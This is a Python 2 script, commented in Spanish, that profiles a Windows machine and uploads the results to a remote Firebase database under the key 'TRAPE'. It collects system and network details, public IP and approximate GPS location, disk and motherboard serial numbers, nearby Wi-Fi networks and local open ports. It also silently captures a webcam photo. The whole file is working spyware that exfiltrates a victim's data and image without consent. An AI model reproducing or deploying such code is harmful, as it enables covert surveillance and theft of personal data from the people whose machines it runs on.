#!/usr/bin/env python
# -*- coding: utf-8 -*-
import platform, re, urllib2, socket, urllib, psutil, sys, traceback, requests
import cv2, wmi
import pyaudio,wave
import uuid
import os
import base64
import subprocess
from dbconnect import db

def getmiIpPublica():
    pagina = urllib.urlopen('https://www.cual-es-mi-ip.net/').read()
    ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', pagina)
    return ip.group()

def getMiIpLocal(Namehost):
    direccion_equipo = socket.gethostbyname(Namehost)
    return direccion_equipo

def to_gb(bytes):
    "Convierte bytes a gigabytes."
    return bytes / 1024**3

def getEspacioEnDisco():
    disk_usage = psutil.disk_usage("C:\\")
    Datos = {"Espacio_total" : str(to_gb(disk_usage.total)),"Espacio_libre": str(to_gb(disk_usage.free)),
    "Espacio_usado":str(to_gb(disk_usage.used)),"Porcentaje de espacio usado": str(disk_usage.percent)}
    return Datos

def getPuertosOpen():
    IP = '127.0.0.1'
    Start = int(7999)
    End = int(8010)
    print '[+] Connecting to %s from %s to %s' % (IP, Start, End)
    connection = socket.socket()
    lista = []
    for i in range(Start, End+1):
        try:
            connection.connect( (IP, i) )
            a= {"Puerto open": i}
        except:
            a= {"Puerto close": i}
        lista.append(a)
    connection.close()
    return lista

def getSerialDisk():
    c = wmi.WMI()
    for item in c.Win32_PhysicalMedia():
        s = item.SerialNumber
        # print str(s)
        # print item.Tag
        break;
    return s

def getSerialUUID():
    #print uuid.UUID(int=uuid.getnode())
    s = uuid.uuid1()
    # print (s)
    return s

def getSerialPlaca():
    # os.system('wmic baseboard get product,Manufacturer,version,serialnumber')
    SP = {
        'product':os.popen('wmic baseboard get product').read(),
        'Manufacturer':os.popen('wmic baseboard get Manufacturer').read(),
        'version':os.popen('wmic baseboard get version').read(),
        'serialnumber':os.popen('wmic baseboard get serialnumber').read()
    }
    return SP

def getInterfacesRed():
    ARed = []
    Red = os.popen('netsh wlan show networks mode=bssid').read()
    ARed.append(Red)
    return Red

def getUbicacionIP():
    pagina = urllib.urlopen('https://es.geoipview.com/').read()
    la = re.search('([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([a])+([t])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
    lo = re.search('([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([0-9])+([.])+([0-9])\w+|([L])+([o])+([n])+([g])+([i])+([t])+([u])+([d])+([:])+([&nbsp;</td><td>])+([-][0-9]{0,})+([.])+([0-9])\w+', pagina)
    regex_coordenadas = r'([0-9])+([.])\w+|([-])([0-9])+([.])\w+'
    lat = re.search(regex_coordenadas, str(la.group(0)))
    long = re.search(regex_coordenadas, str(lo.group(0)))
    gps = {
        'latitud':lat.group(0),
        'longitud':long.group(0)
    }
    return gps

def getFoto():
    cap = cv2.VideoCapture(0)
    leido, frame = cap.read()
    if leido == True:
        cv2.imwrite("foto.png", frame)
        print("Foto tomada correctamente")
        image = open('foto.png', 'rb') #open binary file in read mode
        image_read = image.read()
        image_64_encode = base64.encodestring(image_read)
    else:
        print("Error al acceder a la camara")
    return image_64_encode
    cap.release()

platform_data = platform.uname()
if str(platform_data[0]) == "Windows":
    print('-------Obteniendo Datos Del Sistema------')
    DSistema = ({'Sistema Operativo': str(platform_data[0]),'Nombre De Usuario':str(platform.node()),'Arquitectura': str(platform.machine()),'Version': str(platform.version()),'Procesador:': str(platform.processor())})
    ifr = ('-------Obteniendo Datos de Red------')
    DRed = ({'Nombre de Usuario En Red ': str(platform.node()),'Ip Local': str(getMiIpLocal(platform.node())),'Ip Publica': str(getmiIpPublica())})
    ifd = ('-------Obteniendo Informacion de discos------')
    DDisk = (getEspacioEnDisco())
    print ('Scaneando Puertos....')
    pu= getPuertosOpen()
    DPuertos = (pu)
    print ('------- Obteniendo Ubicacion------')
    msjU = getUbicacionIP()
    DUbicacion = (msjU)
    print ('-------Obteniendo Foto------')
    f = getFoto()
    DFoto = (f)
    print ('-------Obteniendo N serial Disco------')
    s = getSerialDisk()
    DNSDisk = (str(s))
    print ('-------Obteniendo N serial UUID------')
    U = getSerialUUID()
    DNSUUID = (str(U))
    print ('------- Obteniendo Informacion de la placa base------')
    PB = getSerialPlaca()
    DInfoplaca = (PB)
    print ('-------Obteniendo Informacion de las Interfaces de Red------')
    IR = getInterfacesRed()
    DInfored = (IR)
else:
    print ('linux')

DUniversal = ({'Sistema':DSistema,'Red':DRed,'Disk':DDisk,'Puertos':DPuertos,'Ubicacion':DUbicacion,'Foto':DFoto,'DInfoplaca':DInfoplaca})

#enviar datos a firebase
db.child("TRAPE").push(DUniversal)


# starCountRef = firebase.database().ref('posts/' + postId + '/starCount');
# starCountRef.on('value', function(snapshot) {
#   updateStarCount(postElement, snapshot.val());
# });
